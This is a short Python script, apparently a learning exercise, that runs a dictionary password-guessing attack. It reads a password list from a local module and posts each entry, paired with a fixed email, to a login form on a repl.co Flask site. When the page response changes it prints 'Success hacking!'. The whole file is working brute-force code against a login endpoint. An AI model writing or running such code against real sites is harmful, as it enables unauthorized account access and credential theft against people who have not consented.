import requests
import passwords #import my methods

URL = "https://flaskgetpost.shalomvanunu.repl.co/post"

list_of_passwords = passwords.get_password()

for password in list_of_passwords:
#print(password[0:-1])
    site_content = requests.post(URL, data={ "email_input" :"school@gmail.com", "password_input":password[:-1]})
    if "Hello, world!" not in site_content.text:
        print(f"Success hacking! your password is {password}")
    else:
        print("try again")


